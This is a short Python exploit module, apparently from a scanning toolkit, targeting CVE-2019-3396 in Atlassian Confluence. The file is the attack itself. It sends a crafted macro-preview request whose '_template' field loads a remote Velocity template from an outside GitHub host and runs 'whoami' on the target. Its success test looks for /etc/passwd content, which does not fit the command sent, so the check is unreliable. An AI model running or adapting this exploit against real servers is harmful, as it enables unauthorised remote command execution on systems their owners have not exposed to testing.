import requests
from utils import ping
from utils.status import *

class CVE_2019_3396:
    def __init__(self, host) -> None:
        self.name        = "Confluence LFI - CVE_2019_3396"
        self.enable      = True
        self.description = ""
        self.host = host

    def isAlive(self, host):
        return ping.is_alive(host)


    def main(self):
        if self.isAlive(self.host):
            data = '{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"https://raw.githubusercontent.com/r33nd/confluence/master/cmd.vm","cmd":"whoami"}}}'

            request = requests.post(self.host + "/rest/tinymce/1/macro/preview", data=data, headers={
                                    "User-Agent"        : "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
                                    "Referer"           : self.host + "/pages/resumedraft.action?draftId=1&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
                                    "Content-Type"      : "application/json; charset=utf-8",
                                    'X-Atlassian-Token' : 'no-check'
                                    })

            if request.status_code == 200 and 'root:x:0:0:root' in request.text:
                return SUCCESS
            else:
                return FAILED
        else:
            return ERROR